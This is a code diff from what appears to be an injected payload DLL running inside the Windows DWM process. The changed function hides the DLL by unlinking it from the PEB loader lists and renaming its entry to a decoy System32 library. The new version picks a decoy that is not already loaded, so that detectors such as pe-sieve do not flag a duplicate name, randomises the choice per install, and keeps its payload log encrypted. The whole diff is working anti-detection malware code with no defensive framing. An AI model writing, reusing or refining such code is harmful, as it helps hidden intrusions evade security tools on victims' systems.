@@ -136,95 +136,188 @@ static void peb_unlink_dll(HMODULE self) {
         if (!peb || !peb->Ldr) return;
         PEB_LDR_DATA_PEBUL *ldr = peb->Ldr;
 
-        /* Walk InLoadOrderModuleList looking for our DllBase. */
+        /* Decoy pool. v1.7.3 (2026-07-18): install-aware pick — we
+         * enumerate DWM's actual loaded modules first and prefer a
+         * decoy that ISN'T among them. Rationale:
+         *   - If the decoy IS already loaded (e.g. dcomp.dll — DWM
+         *     always has this), a "duplicate BaseDllName in LDR"
+         *     correlator (Blackbone, pe-sieve, DetectMemoryHollowing)
+         *     immediately flags us: two dcomp.dll entries at different
+         *     DllBases = obvious injection.
+         *   - If the decoy is NOT already loaded, no duplicate signal.
+         *     The lack of any credible reason for that DLL being in
+         *     DWM is a much weaker signal than duplicate.
+         * The pool is randomized per install (seed = pid ^ tick) so
+         * repeat installs on the same box don't converge on the same
+         * decoy — makes fingerprinting across users harder. */
+        static WCHAR *pool_base[] = {
+            L"uiribbon.dll",
+            L"uiribbonres.dll",
+            L"dcomp.dll",
+            L"dwmredir.dll",
+            L"windowscodecs.dll",
+            L"twinapi.dll",
+            L"prntvpt.dll"
+        };
+        static WCHAR *pool_full[] = {
+            L"C:\\Windows\\System32\\uiribbon.dll",
+            L"C:\\Windows\\System32\\uiribbonres.dll",
+            L"C:\\Windows\\System32\\dcomp.dll",
+            L"C:\\Windows\\System32\\dwmredir.dll",
+            L"C:\\Windows\\System32\\windowscodecs.dll",
+            L"C:\\Windows\\System32\\twinapi.dll",
+            L"C:\\Windows\\System32\\prntvpt.dll"
+        };
+        #define SVC_DECOY_POOL_SIZE 7
+        const int n_pool = SVC_DECOY_POOL_SIZE;
+        BOOL pool_loaded[SVC_DECOY_POOL_SIZE] = {0};
+
+        /* SINGLE walk of InLoadOrderModuleList:
+         *   1. Check every entry's BaseDllName against our pool → mark
+         *      pool_loaded[i] for any decoy that's already loaded.
+         *   2. Remember our entry pointer (delayed mutation — do the
+         *      unlink+spoof AFTER the walk completes so mid-walk pointer
+         *      invalidation can't happen).
+         * The walk is SEH-wrapped by the outer __try, so a race with
+         * LdrLoadDll/LdrUnloadDll is caught cleanly. */
+        LDR_DATA_TABLE_ENTRY_PEBUL *our_ent = NULL;
         LIST_ENTRY_PEBUL *head = &ldr->InLoadOrderModuleList;
         LIST_ENTRY_PEBUL *cur  = head->Flink;
-        int unlinks = 0;
+        int scanned = 0;
         while (cur && cur != head) {
             LDR_DATA_TABLE_ENTRY_PEBUL *ent =
                 (LDR_DATA_TABLE_ENTRY_PEBUL *)cur;
             LIST_ENTRY_PEBUL *next = cur->Flink;
-            if (ent->DllBase == self) {
-                /* Unlink from all three lists. Each LIST_ENTRY has
-                 * Flink/Blink pointing at neighbors. Point them at
-                 * each other, cut us out. Then point our own back
-                 * at ourselves (harmless idle state). */
-                LIST_ENTRY_PEBUL *l1 = &ent->InLoadOrderLinks;
-                LIST_ENTRY_PEBUL *l2 = &ent->InMemoryOrderLinks;
-                LIST_ENTRY_PEBUL *l3 = &ent->InInitializationOrderLinks;
-                if (l1->Blink && l1->Flink) {
-                    l1->Blink->Flink = l1->Flink;
-                    l1->Flink->Blink = l1->Blink;
-                    l1->Flink = l1->Blink = l1;
-                }
-                if (l2->Blink && l2->Flink) {
-                    l2->Blink->Flink = l2->Flink;
-                    l2->Flink->Blink = l2->Blink;
-                    l2->Flink = l2->Blink = l2;
-                }
-                if (l3->Blink && l3->Flink) {
-                    l3->Blink->Flink = l3->Flink;
-                    l3->Flink->Blink = l3->Blink;
-                    l3->Flink = l3->Blink = l3;
-                }
+            scanned++;
 
-                /* Spoof BaseDllName + FullDllName to an innocuous
-                 * Windows DLL. Randomized per install from a pool of
-                 * real fringe DLLs that DWM commonly co-loads. Random
-                 * seed = (pid ^ tick) so we're consistent across a
-                 * single session but different install-to-install. */
-                static WCHAR *pool_base[] = {
-                    L"uiribbon.dll",
-                    L"uiribbonres.dll",
-                    L"dcomp.dll",
-                    L"dwmredir.dll",
-                    L"windowscodecs.dll",
-                    L"twinapi.dll",
-                    L"prntvpt.dll"
-                };
-                static WCHAR *pool_full[] = {
-                    L"C:\\Windows\\System32\\uiribbon.dll",
-                    L"C:\\Windows\\System32\\uiribbonres.dll",
-                    L"C:\\Windows\\System32\\dcomp.dll",
-                    L"C:\\Windows\\System32\\dwmredir.dll",
-                    L"C:\\Windows\\System32\\windowscodecs.dll",
-                    L"C:\\Windows\\System32\\twinapi.dll",
-                    L"C:\\Windows\\System32\\prntvpt.dll"
-                };
-                const int n_pool = sizeof(pool_base) / sizeof(pool_base[0]);
-                unsigned seed = (unsigned)(GetCurrentProcessId() ^ GetTickCount());
-                int pick = (int)(seed % (unsigned)n_pool);
-                WCHAR *sb = pool_base[pick];
-                WCHAR *sf = pool_full[pick];
-                /* Compute lengths (UTF-16 wide char = 2 bytes each,
-                 * Length is bytes NOT chars, doesn't count NUL). */
-                size_t sb_chars = wcslen(sb);
-                size_t sf_chars = wcslen(sf);
-                ent->BaseDllName.Buffer        = sb;
-                ent->BaseDllName.Length        = (USHORT)(sb_chars * sizeof(WCHAR));
-                ent->BaseDllName.MaximumLength = (USHORT)((sb_chars + 1) * sizeof(WCHAR));
-                ent->FullDllName.Buffer        = sf;
-                ent->FullDllName.Length        = (USHORT)(sf_chars * sizeof(WCHAR));
-                ent->FullDllName.MaximumLength = (USHORT)((sf_chars + 1) * sizeof(WCHAR));
-
-                unlinks++;
-                {
-                    char nbuf[64] = {0};
-                    /* Log which decoy we picked — encrypted so it's
-                     * install-specific intel, not a fingerprint on
-                     * disk. Convert wide to ANSI for the log. */
-                    for (size_t k = 0; k < sb_chars && k < 63; k++) {
-                        nbuf[k] = (char)sb[k];
+            /* Pool membership check — cheap prefix compare, case
+             * insensitive. Skip anything with implausible length so we
+             * don't chase a corrupt LDR entry into the weeds. */
+            if (ent->BaseDllName.Buffer &&
+                ent->BaseDllName.Length > 0 &&
+                ent->BaseDllName.Length < 256) {
+                for (int i = 0; i < n_pool; i++) {
+                    if (pool_loaded[i]) continue;
+                    size_t plen = wcslen(pool_base[i]);
+                    if ((USHORT)(plen * sizeof(WCHAR)) == ent->BaseDllName.Length &&
+                        _wcsnicmp(ent->BaseDllName.Buffer, pool_base[i], plen) == 0) {
+                        pool_loaded[i] = TRUE;
+                        break;
                     }
-                    slog_writef("payload.log",
-                        "peb_unlink: unlinked + spoofed BaseDllName -> %s (pick=%d)",
-                        nbuf, pick);
                 }
-                break;
+            }
+
+            if (ent->DllBase == self) {
+                our_ent = ent;
+                /* Do NOT break — keep walking to complete the pool scan
+                 * (some pool DLLs may appear AFTER us in load order). */
             }
             cur = next;
         }
-        (void)unlinks;
+
+        if (!our_ent) {
+            slog_writef("payload.log",
+                "peb_unlink: no LDR entry found for base=%p (scanned=%d) — "
+                "nothing to hide via PEB path (manual-map behavior)",
+                (void *)self, scanned);
+            return;
+        }
+
+        /* Build a compact log of which decoys are loaded vs available.
+         * Encrypted at rest, but still keep it compact — noisy logs are
+         * a bad habit. */
+        int loaded_count = 0, avail_count = 0;
+        char loaded_str[192] = {0}; int lo_off = 0;
+        char avail_str[192]  = {0}; int av_off = 0;
+        for (int i = 0; i < n_pool; i++) {
+            const WCHAR *n = pool_base[i];
+            char ans[32] = {0};
+            for (size_t k = 0; n[k] && k < 31; k++) ans[k] = (char)n[k];
+            if (pool_loaded[i]) {
+                loaded_count++;
+                int rem = (int)sizeof(loaded_str) - lo_off - 1;
+                if (rem > 2) {
+                    lo_off += _snprintf(loaded_str + lo_off, (size_t)rem,
+                                        "%s%s", lo_off ? "," : "", ans);
+                }
+            } else {
+                avail_count++;
+                int rem = (int)sizeof(avail_str) - av_off - 1;
+                if (rem > 2) {
+                    av_off += _snprintf(avail_str + av_off, (size_t)rem,
+                                        "%s%s", av_off ? "," : "", ans);
+                }
+            }
+        }
+        slog_writef("payload.log",
+            "peb_unlink: pool scan complete (scanned=%d ldr entries): "
+            "loaded=[%s] available=[%s]",
+            scanned, loaded_str, avail_str);
+
+        /* Now do the mutation on the remembered entry. Unlink from
+         * all three lists — same technique as pre-v1.7.3. */
+        LIST_ENTRY_PEBUL *l1 = &our_ent->InLoadOrderLinks;
+        LIST_ENTRY_PEBUL *l2 = &our_ent->InMemoryOrderLinks;
+        LIST_ENTRY_PEBUL *l3 = &our_ent->InInitializationOrderLinks;
+        if (l1->Blink && l1->Flink) {
+            l1->Blink->Flink = l1->Flink;
+            l1->Flink->Blink = l1->Blink;
+            l1->Flink = l1->Blink = l1;
+        }
+        if (l2->Blink && l2->Flink) {
+            l2->Blink->Flink = l2->Flink;
+            l2->Flink->Blink = l2->Blink;
+            l2->Flink = l2->Blink = l2;
+        }
+        if (l3->Blink && l3->Flink) {
+            l3->Blink->Flink = l3->Flink;
+            l3->Flink->Blink = l3->Blink;
+            l3->Flink = l3->Blink = l3;
+        }
+
+        /* Pick decoy from the NOT-loaded subset. If (implausibly) every
+         * pool DLL is already loaded, fall back to uniform pick over
+         * the whole pool (accept the duplicate-name signal — no better
+         * option). Log the FALLBACK case explicitly for support. */
+        unsigned seed = (unsigned)(GetCurrentProcessId() ^ GetTickCount());
+        int pick = 0;
+        BOOL fallback = FALSE;
+        if (avail_count > 0) {
+            int target = (int)(seed % (unsigned)avail_count);
+            int idx = 0;
+            for (int i = 0; i < n_pool; i++) {
+                if (!pool_loaded[i]) {
+                    if (idx == target) { pick = i; break; }
+                    idx++;
+                }
+            }
+        } else {
+            pick = (int)(seed % (unsigned)n_pool);
+            fallback = TRUE;
+        }
+
+        WCHAR *sb = pool_base[pick];
+        WCHAR *sf = pool_full[pick];
+        size_t sb_chars = wcslen(sb);
+        size_t sf_chars = wcslen(sf);
+        our_ent->BaseDllName.Buffer        = sb;
+        our_ent->BaseDllName.Length        = (USHORT)(sb_chars * sizeof(WCHAR));
+        our_ent->BaseDllName.MaximumLength = (USHORT)((sb_chars + 1) * sizeof(WCHAR));
+        our_ent->FullDllName.Buffer        = sf;
+        our_ent->FullDllName.Length        = (USHORT)(sf_chars * sizeof(WCHAR));
+        our_ent->FullDllName.MaximumLength = (USHORT)((sf_chars + 1) * sizeof(WCHAR));
+
+        {
+            char nbuf[64] = {0};
+            for (size_t k = 0; k < sb_chars && k < 63; k++) {
+                nbuf[k] = (char)sb[k];
+            }
+            slog_writef("payload.log",
+                "peb_unlink: unlinked + spoofed BaseDllName -> %s "
+                "(pick=%d, avail=%d, loaded=%d%s)",
+                nbuf, pick, avail_count, loaded_count,
+                fallback ? ", FALLBACK-duplicate-name" : "");
+        }
     } __except (EXCEPTION_EXECUTE_HANDLER) {
         slog_write("payload.log", "peb_unlink: EXCEPTION — DLL remains visible");
     }
